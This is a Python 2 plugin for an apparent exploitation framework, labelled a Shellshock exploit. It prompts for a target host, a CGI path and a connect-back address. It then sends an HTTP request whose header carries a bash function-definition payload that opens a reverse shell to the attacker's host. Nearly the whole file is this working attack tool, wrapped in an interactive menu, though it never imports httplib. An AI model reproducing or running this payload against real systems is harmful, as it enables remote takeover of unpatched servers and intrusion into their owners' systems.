Description = 'Shell shock exploit'

import re
import sys
import string
import time
import random
import sys
import os
import logging
from lxml import etree
from urlparse import urlparse
from struct import pack

plugin_description = Description
intname = "rsf"
det = sys.argv[0]
dala = det.split('.')[-2]
fin = dala.split('plugins/')[-1]
__plugin__      = "%s.plugin" % (fin)
RescoursesDir = os.getcwd()
dandtime = time.strftime("%H:%M:%S")
logfile = "%s/storage/logs/%s.log" % (RescoursesDir,dandtime)

class Tee(object):
  def __init__(self):
    self.file = open(logfile, 'a')
    self.stdout = sys.stdout

  def __del__(self):
    sys.stdout = self.stdout
    self.file.close()

  def write(self, data):
    self.file.write(data)
    self.stdout.write(data)

sys.stdout = Tee()

tree = etree.parse("storage/logs/config.xml")
for user in tree.xpath("/configuration/config/default_target"):
	ip = "%s" % (user.text)

def kappa(host,path,conecc):
    conn = httplib.HTTPConnection(host)
    reverse_shell="() { ignored;};/bin/bash -i >& /dev/tcp/%s 0>&1" % conecc

    headers = {"Content-type": "application/x-www-form-urlencoded", "test":reverse_shell }
    conn.request("GET",path,headers=headers)
    res = conn.getresponse()
    print res.status, res.reason
    data = res.read()
    print data



def dash():
    while True:
        line_1 = "" + intname + "(\033[1;31m" + fin + "\033[1;m) > "
        terminal = raw_input(line_1).lower()
        time.sleep(0.5)
        if terminal == 'help':
            print "\n"
            print "Core Commands"
            print "============="
            print ""
            print "  Command         Description"
            print "  -------         -----------"
            print "  help            show help menu"
            print "  execute         run the plugin"
            print "  exit            exit the current plugin"
            print "  info            show plugin description"
            print ""
        elif terminal == 'execute':
            aner()
        elif terminal == "info":
            print plugin_description
            dash()
        elif terminal == 'exit':
            exit()
        else:
            print "Unknown syntax: %s" % (terminal)

def aner():
    ifno = "localhost"
    lolk = "cgi-bin/kappa.cgi"
    realexample = "8.8.8.8/69"
    time.sleep(0.2)
    print "\033[1;94m[?]\033[1;m RHOST :: Target Adress."
    rhost = raw_input('\033[1;92m[+]\033[1;m Rhost: [' + ifno + ']: ') or ifno
    print "\033[1;94m[?]\033[1;m CGI-Path :: Location to vulnerable CGI."
    location = raw_input('\033[1;92m[+]\033[1;m CGI: [' + lolk + ']: ') or lolk
    print "\033[1;94m[?]\033[1;m IP addr :: Ip adress for shell!"
    revshell = raw_input('\033[1;92m[+]\033[1;m Connect back IP: [' + realexample + ']: ') or realexample


    yen = "yes"
    et = "yes"
    print "\033[1;94m[?]\033[1;m Configuring Plugin"
    time.sleep(1)
    print ""
    print "Name             Set Value"
    print "----             ----------"
    print "RHOST            %s" % (rhost)
    print "PATH             %s" % (location)
    print "LHOST            %s" % (revshell)
    print "Plugin           %s" % (fin)
    print "\n"
    et = raw_input("\033[1;94m[?]\033[1;m Execute Plugins? [" + yen + "]: ")  or yen
    if et == 'yes':
        kappa(rhost,location,revshell)
    elif et == 'no':
        print "Goodbye ;("
        sys.exit()
    else:
        print "\033[1;92m[!] No options were chosen.\033[1;m"


dash()
